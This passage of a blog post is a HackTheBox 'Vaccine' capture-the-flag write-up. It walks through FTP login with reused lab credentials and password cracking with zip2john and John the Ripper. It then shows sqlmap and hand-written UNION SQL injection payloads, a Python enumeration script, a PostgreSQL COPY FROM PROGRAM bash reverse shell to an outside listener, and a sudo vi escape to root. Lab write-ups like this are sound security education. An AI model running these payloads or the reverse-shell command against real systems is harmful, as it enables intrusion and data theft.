</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="n">_</span><span class="w">      </span><span class="n">httponly</span><span class="w"> </span><span class="n">flag</span><span class="w"> </span><span class="k">not</span><span class="w"> </span><span class="k">set</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="n">server</span><span class="o">-</span><span class="n">header</span><span class="p">:</span><span class="w"> </span><span class="n">Apache</span><span class="o">/</span><span class="mi">2</span><span class="p">.</span><span class="mi">4</span><span class="p">.</span><span class="mi">41</span><span class="w"> </span><span class="p">(</span><span class="n">Ubuntu</span><span class="p">)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="n">title</span><span class="p">:</span><span class="w"> </span><span class="n">MegaCorp</span><span class="w"> </span><span class="n">Login</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Service</span><span class="w"> </span><span class="n">Info</span><span class="p">:</span><span class="w"> </span><span class="n">OSs</span><span class="p">:</span><span class="w"> </span><span class="n">Unix</span><span class="p">,</span><span class="w"> </span><span class="n">Linux</span><span class="p">;</span><span class="w"> </span><span class="n">CPE</span><span class="p">:</span><span class="w"> </span><span class="n">cpe</span><span class="p">:</span><span class="o">/</span><span class="n">o</span><span class="p">:</span><span class="n">linux</span><span class="p">:</span><span class="n">linux_kernel</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Service</span><span class="w"> </span><span class="n">detection</span><span class="w"> </span><span class="n">performed</span><span class="p">.</span><span class="w"> </span><span class="n">Please</span><span class="w"> </span><span class="n">report</span><span class="w"> </span><span class="k">any</span><span class="w"> </span><span class="n">incorrect</span><span class="w"> </span><span class="n">results</span><span class="w"> </span><span class="k">at</span><span class="w"> </span><span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">nmap</span><span class="p">.</span><span class="n">org</span><span class="o">/</span><span class="n">submit</span><span class="o">/</span><span class="w"> </span><span class="p">.</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">#</span><span class="w"> </span><span class="n">Nmap</span><span class="w"> </span><span class="n">done</span><span class="w"> </span><span class="k">at</span><span class="w"> </span><span class="n">Sun</span><span class="w"> </span><span class="n">Jun</span><span class="w">  </span><span class="mi">6</span><span class="w"> </span><span class="mi">01</span><span class="p">:</span><span class="mi">34</span><span class="p">:</span><span class="mi">04</span><span class="w"> </span><span class="mi">2021</span><span class="w"> </span><span class="c1">-- 1 IP address (1 host up) scanned in 1691.79 seconds
</span></span></span></code></pre></td></tr></table>
</div>
</div><ul>
<li>The result of both this scan</li>
<li>open ports
<ul>
<li>21 / ftp</li>
<li>22 / SSH</li>
<li>80 / http</li>
</ul>
</li>
</ul>
<h2 id="ftp">FTP</h2>
<ul>
<li>
<p>login with this credentials</p>
<ul>
<li><code>ftpuser:mc@F1l3ZilL4</code></li>
<li>this credentails found from previous machine called <code>oopsie</code></li>
</ul>
</li>
<li>
<p>Found <code>backup.zip</code> file</p>
</li>
</ul>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/posts/htb/vaccine/1.png"
        data-srcset="/posts/htb/vaccine/1.png, /posts/htb/vaccine/1.png 1.5x, /posts/htb/vaccine/1.png 2x"
        data-sizes="auto"
        alt="/posts/htb/vaccine/1.png"
        title="1" width="704" height="313" /></p>
<ul>
<li>download the <code>zip file</code></li>
</ul>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/posts/htb/vaccine/2.png"
        data-srcset="/posts/htb/vaccine/2.png, /posts/htb/vaccine/2.png 1.5x, /posts/htb/vaccine/2.png 2x"
        data-sizes="auto"
        alt="/posts/htb/vaccine/2.png"
        title="1" width="703" height="324" /></p>
<h2 id="zip2john">Zip2John</h2>
<ul>
<li>the zip file is encrypted</li>
</ul>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/posts/htb/vaccine/3.png"
        data-srcset="/posts/htb/vaccine/3.png, /posts/htb/vaccine/3.png 1.5x, /posts/htb/vaccine/3.png 2x"
        data-sizes="auto"
        alt="/posts/htb/vaccine/3.png"
        title="1" width="674" height="197" /></p>
<ul>
<li>Time to use <code>zip2john</code></li>
<li>Direct the output from <code>zip2john</code> into file called <code>backup.hash</code></li>
</ul>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/posts/htb/vaccine/4.png"
        data-srcset="/posts/htb/vaccine/4.png, /posts/htb/vaccine/4.png 1.5x, /posts/htb/vaccine/4.png 2x"
        data-sizes="auto"
        alt="/posts/htb/vaccine/4.png"
        title="1" width="1177" height="864" /></p>
<h3 id="john-the-ripperjtr">John-The-Ripper[JtR]</h3>
<ul>
<li>Use JtR to crack it
<ul>
<li>found the password</li>
</ul>
</li>
</ul>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/posts/htb/vaccine/5.png"
        data-srcset="/posts/htb/vaccine/5.png, /posts/htb/vaccine/5.png 1.5x, /posts/htb/vaccine/5.png 2x"
        data-sizes="auto"
        alt="/posts/htb/vaccine/5.png"
        title="1" width="933" height="396" /></p>
<h3 id="content-of-the-zipfile">Content of the ZipFile</h3>
<ul>
<li>
<p>Unzip and got 2 files called</p>
<ul>
<li><code>index.php</code></li>
<li><code>style.css</code></li>
</ul>
</li>
<li>
<p>Found the password in <code>index.php</code></p>
</li>
</ul>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/posts/htb/vaccine/6.png"
        data-srcset="/posts/htb/vaccine/6.png, /posts/htb/vaccine/6.png 1.5x, /posts/htb/vaccine/6.png 2x"
        data-sizes="auto"
        alt="/posts/htb/vaccine/6.png"
        title="1" width="1268" height="368" /></p>
<ul>
<li>turns out, it is <code>md5 hash</code></li>
<li>crack it using online tool
<ul>
<li><a href="https://crackstation.net/" target="_blank" rel="noopener noreffer ">crackstation.net</a></li>
</ul>
</li>
</ul>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/posts/htb/vaccine/7.png"
        data-srcset="/posts/htb/vaccine/7.png, /posts/htb/vaccine/7.png 1.5x, /posts/htb/vaccine/7.png 2x"
        data-sizes="auto"
        alt="/posts/htb/vaccine/7.png"
        title="1" width="1058" height="356" /></p>
<h2 id="the-website">The Website</h2>
<ul>
<li>Login with the password found in <code>index.php</code> file</li>
</ul>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/posts/htb/vaccine/8.png"
        data-srcset="/posts/htb/vaccine/8.png, /posts/htb/vaccine/8.png 1.5x, /posts/htb/vaccine/8.png 2x"
        data-sizes="auto"
        alt="/posts/htb/vaccine/8.png"
        title="1" width="1040" height="712" /></p>
<ul>
<li>Assuming this is a database loaded several cars</li>
<li>Try to insert <code>'</code> in the search field and got this error</li>
</ul>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/posts/htb/vaccine/9.png"
        data-srcset="/posts/htb/vaccine/9.png, /posts/htb/vaccine/9.png 1.5x, /posts/htb/vaccine/9.png 2x"
        data-sizes="auto"
        alt="/posts/htb/vaccine/9.png"
        title="1" width="1012" height="442" /></p>
<h3 id="sqlmap">SQLmap</h3>
<ul>
<li>Here is the syntax. Sqlmap also needed cookie for this to work</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sqlmap.py -u <span class="s1">&#39;http://10.10.10.46/dashboard.php?search=sunny&#39;</span> --cookie<span class="o">=</span><span class="s2">&#34;PHPSESSID=q14pc524upvp0hspqoh1n5nq8p&#34;</span> --batch
</span></span></code></pre></td></tr></table>
</div>
</div><p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/posts/htb/vaccine/10.png"
        data-srcset="/posts/htb/vaccine/10.png, /posts/htb/vaccine/10.png 1.5x, /posts/htb/vaccine/10.png 2x"
        data-sizes="auto"
        alt="/posts/htb/vaccine/10.png"
        title="1" width="1061" height="175" /></p>
<ul>
<li>This server is using PostgreSQL database</li>
<li>Sqlmap also found vulnerability can lead into injections</li>
</ul>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/posts/htb/vaccine/11.png"
        data-srcset="/posts/htb/vaccine/11.png, /posts/htb/vaccine/11.png 1.5x, /posts/htb/vaccine/11.png 2x"
        data-sizes="auto"
        alt="/posts/htb/vaccine/11.png"
        title="1" width="1269" height="470" /></p>
<h3 id="union-select">UNION select</h3>
<ul>
<li>Source
<ul>
<li><a href="https://portswigger.net/web-security/sql-injection/union-attacks" target="_blank" rel="noopener noreffer ">SQLinjection UNION attacks[PortSwigger]</a></li>
</ul>
</li>
</ul>
<h3 id="finding-columns-for-attack">Finding Columns for attack</h3>
<ul>
<li>Finding how many columns for SQL injection attack</li>
<li>By inserting this into <code>search field</code>:
<ul>
<li><code>' ORDER BY 1--</code></li>
<li><code>' ORDER BY 2--</code></li>
<li><code>' ORDER BY 3--</code> .. and so on.
-  Until you&rsquo;ve found an error.</li>
</ul>
</li>
</ul>
<h3 id="python-script">Python script</h3>
<ul>
<li>However, I&rsquo;m kinda lazy. So, I made python script for it.</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/env python3</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">100</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">url</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;http://10.10.10.46/dashboard.php?search=&#39; ORDER BY </span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s2"> --&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="n">c</span> <span class="o">=</span> <span class="p">{</span><span class="s1">&#39;PHPSESSID&#39;</span><span class="p">:</span><span class="s1">&#39;lfbncgq98bat28uu4v3r4j2dnh&#39;</span><span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">cookies</span><span class="o">=</span><span class="n">c</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">content</span><span class="p">)</span> <span class="o">==</span> <span class="mi">2449</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Error Not Here </span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Error Here </span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><ul>
<li>the result</li>
</ul>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/posts/htb/vaccine/12.png"
        data-srcset="/posts/htb/vaccine/12.png, /posts/htb/vaccine/12.png 1.5x, /posts/htb/vaccine/12.png 2x"
        data-sizes="auto"
        alt="/posts/htb/vaccine/12.png"
        title="1" width="299" height="166" /></p>
<ul>
<li>By looking at this result, we&rsquo;ve found 5 columns.</li>
</ul>
<h3 id="finding-columns-with-useful-data">Finding Columns with useful data</h3>
<blockquote>
<p>Generally, the interesting data that you want to retrieve will be in string form, so you need to find one or more columns in the original query results whose data type is, or is compatible with, string data.</p>
</blockquote>
<ul>
<li>
<p>Now, we just found <code>5 columns</code></p>
</li>
<li>
<p>The next payload gonna be using <code>UNION SELECT</code></p>
</li>
<li>
<p><code>Place string into each column.</code></p>
</li>
<li>
<p>This is what I&rsquo;m gonna try:</p>
<ul>
<li><code>' UNION SELECT 'a',NULL,NULL,NULL,NULL--</code></li>
<li><code>' UNION SELECT NULL,'a',NULL,NULL,NULL--</code></li>
<li><code>' UNION SELECT NULL,NULL,'a',NULL,NULL--</code></li>
<li><code>' UNION SELECT NULL,NULL,NULL,'a',NULL--</code></li>
<li><code>' UNION SELECT NULL,NULL,NULL,NULL,'a'--</code></li>
</ul>
</li>
<li>
<p>Well, we&rsquo;ve found an error at the first column that state:</p>
<ul>
<li><code>ERROR:  invalid input syntax for integer: &quot;a&quot; LINE 1: ...ect \* from cars where name ilike '%' UNION SELECT 'a',NULL,N...</code></li>
</ul>
</li>
</ul>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/posts/htb/vaccine/13.png"
        data-srcset="/posts/htb/vaccine/13.png, /posts/htb/vaccine/13.png 1.5x, /posts/htb/vaccine/13.png 2x"
        data-sizes="auto"
        alt="/posts/htb/vaccine/13.png"
        title="1" width="1013" height="744" /></p>
<blockquote>
<p>If the data type of a column is not compatible with string data, the injected query will cause a database error, such as:
<code>Conversion failed when converting the varchar value 'a' to data type int.</code></p>
</blockquote>
<ul>
<li>The rest of it. Work Fine</li>
</ul>
<h2 id="footholdgaining-access">Foothold/Gaining Access</h2>
<h3 id="the-version-of-database">The Version of database</h3>
<ul>
<li>Let&rsquo;s get the database version by inserting this in search field:</li>
<li><code>' UNION SELECT NULL,VERSION(),NULL,NULL,NULL--</code></li>
<li>The result</li>
</ul>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/posts/htb/vaccine/14.png"
        data-srcset="/posts/htb/vaccine/14.png, /posts/htb/vaccine/14.png 1.5x, /posts/htb/vaccine/14.png 2x"
        data-sizes="auto"
        alt="/posts/htb/vaccine/14.png"
        title="1" width="1035" height="801" /></p>
<h2 id="exploit">Exploit</h2>
<ul>
<li>
<p>I found this article</p>
</li>
<li>
<p><a href="https://medium.com/greenwolf-security/authenticated-arbitrary-command-execution-on-postgresql-9-3-latest-cd18945914d5" target="_blank" rel="noopener noreffer ">Authenticated Arbitrary Command Execution on PostgreSQL 9.3 &gt; Latest</a></p>
</li>
<li>
<p>Let&rsquo;s try exploit it.</p>
</li>
<li>
<p>by inserting this:</p>
<ul>
<li><code>';DROP TABLE IF EXISTS cmd_exec;--</code></li>
<li><code>';CREATE TABLE cmd_exec(cmd_output text);--</code></li>
<li><code>';COPY cmd_exec FROM PROGRAM 'bash -c &quot;bash -i &gt;&amp; /dev/tcp/10.10.16.86/9901 0&gt;&amp;1&quot;;'--</code></li>
</ul>
</li>
</ul>
<h2 id="reverse-shell">Reverse Shell</h2>
<ul>
<li>Got the reverse shell</li>
</ul>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/posts/htb/vaccine/15.png"
        data-srcset="/posts/htb/vaccine/15.png, /posts/htb/vaccine/15.png 1.5x, /posts/htb/vaccine/15.png 2x"
        data-sizes="auto"
        alt="/posts/htb/vaccine/15.png"
        title="1" width="802" height="398" /></p>
<ul>
<li>Found ssh key</li>
</ul>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/posts/htb/vaccine/16.png"
        data-srcset="/posts/htb/vaccine/16.png, /posts/htb/vaccine/16.png 1.5x, /posts/htb/vaccine/16.png 2x"
        data-sizes="auto"
        alt="/posts/htb/vaccine/16.png"
        title="1" width="705" height="313" /></p>
<h2 id="ssh">SSH</h2>
<ul>
<li>Copy the key and change the permission with <code>chmod 600</code></li>
<li>ssh into it</li>
</ul>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/posts/htb/vaccine/17.png"
        data-srcset="/posts/htb/vaccine/17.png, /posts/htb/vaccine/17.png 1.5x, /posts/htb/vaccine/17.png 2x"
        data-sizes="auto"
        alt="/posts/htb/vaccine/17.png"
        title="1" width="1154" height="630" /></p>
<ul>
<li>Let&rsquo;s take a look at the website folder</li>
<li><code>/var/www/html</code></li>
<li>we&rsquo;ve found a lot of files</li>
</ul>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/posts/htb/vaccine/18.png"
        data-srcset="/posts/htb/vaccine/18.png, /posts/htb/vaccine/18.png 1.5x, /posts/htb/vaccine/18.png 2x"
        data-sizes="auto"
        alt="/posts/htb/vaccine/18.png"
        title="1" width="620" height="342" /></p>
<ul>
<li>First, lets check if there any user on it by using <code>grep</code></li>
</ul>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/posts/htb/vaccine/19.png"
        data-srcset="/posts/htb/vaccine/19.png, /posts/htb/vaccine/19.png 1.5x, /posts/htb/vaccine/19.png 2x"
        data-sizes="auto"
        alt="/posts/htb/vaccine/19.png"
        title="1" width="1265" height="428" /></p>
<ul>
<li>
<p>Found 2 user exist:</p>
<ul>
<li><code>admin</code></li>
<li><code>postgres</code></li>
</ul>
</li>
<li>
<p>However, postgres user have it&rsquo;s own password.</p>
</li>
<li>
<p>Now, we&rsquo;ve got the password. Let&rsquo;s try check the sudo permission on it by typing <code>sudo -l</code></p>
</li>
</ul>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/posts/htb/vaccine/20.png"
        data-srcset="/posts/htb/vaccine/20.png, /posts/htb/vaccine/20.png 1.5x, /posts/htb/vaccine/20.png 2x"
        data-sizes="auto"
        alt="/posts/htb/vaccine/20.png"
        title="1" width="1241" height="239" /></p>
<h2 id="privilege-escalation">Privilege Escalation</h2>
<ul>
<li>Interesting, this user can run <code>vi</code> as sudo on specific file</li>
<li>Let&rsquo;s execute it by open the file with full path
<ul>
<li><code>sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf</code></li>
<li>now, press <code>esc</code> and type <code>:!/bin/sh</code></li>
<li>press <code>return</code></li>
<li>Source
- <a href="https://gtfobins.github.io/gtfobins/vi/#sudo" target="_blank" rel="noopener noreffer ">sudo vi GTFOBins</a></li>
</ul>
</li>
</ul>
<h3 id="root">Root</h3>
<ul>
<li>Now, I&rsquo;m root</li>
<li>Found the root flag</li>
</ul>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/posts/htb/vaccine/21.png"
        data-srcset="/posts/htb/vaccine/21.png, /posts/htb/vaccine/21.png 1.5x, /posts/htb/vaccine/21.png 2x"
        data-sizes="auto"
        alt="/posts/htb/vaccine/21.png"
        title="1" width="772" height="378" /></p>
<h2 id="conclusion">Conclusion</h2>
<p>I’ve learned a lot today. Make sure to configure the database properly and please update it. Use, long and complicate passwords. DO NOT mix around with the <code>user command</code> and the <code>root command</code>.</p>
<p>I have a fun time doing this machine and I hope you guys do too. Bye ;)</p>
</div><div class="post-footer" id="post-footer">
    <div class="post-info">
        <div class="post-info-line">
            <div class="post-info-mod">
                <span>Updated on 21-07-2021</span>
            </div></div>
        <div class="post-info-line">
            <div class="post-info-md"></div>
            <div class="post-info-share">
                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://shafiqaiman.com/posts/htb/vaccine/" data-title="HackTheBox - Vaccine Writeup" data-via="_shafiqaiman_" data-hashtags="sqlmap,sql-union,GTFOBins"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Linkedin" data-sharer="linkedin" data-url="https://shafiqaiman.com/posts/htb/vaccine/"><i class="fab fa-linkedin fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Hacker News" data-sharer="hackernews" data-url="https://shafiqaiman.com/posts/htb/vaccine/" data-title="HackTheBox - Vaccine Writeup"><i class="fab fa-hacker-news fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Reddit" data-sharer="reddit" data-url="https://shafiqaiman.com/posts/htb/vaccine/"><i class="fab fa-reddit fa-fw" aria-hidden="true"></i></a></span>
            </div>
        </div>
    </div>

    <div class="post-info-more">
        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/sqlmap/">sqlmap</a>,&nbsp;<a href="/tags/sql-union/">sql-union</a>,&nbsp;<a href="/tags/gtfobins/">GTFOBins</a></section>
        <section>
            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
        </section>
    </div>

    <div class="post-nav"><a href="/posts/thm/agent_sudo/" class="prev" rel="prev" title="TryHackMe - Agent Sudo Writeup"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>TryHackMe - Agent Sudo Writeup</a>
            <a href="/posts/htb/unified/" class="next" rel="next" title="HackTheBox - Unified Writeup">HackTheBox - Unified Writeup<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
</div>
</article></div>
            </main><footer class="footer">
        <div class="footer-container"><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2021 - 2023</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="https://shafiqaiman.com" target="_blank">SHAFIQAIMAN</a></span></div>
        </div>
    </footer></div>

        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
            </a>
        </div><script type="text/javascript" src="/lib/autocomplete/autocomplete.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":50},"comment":{},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","maxResultLength":10,"noResultsFound":"No results found","snippetLength":30,"type":"lunr"}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
</html>
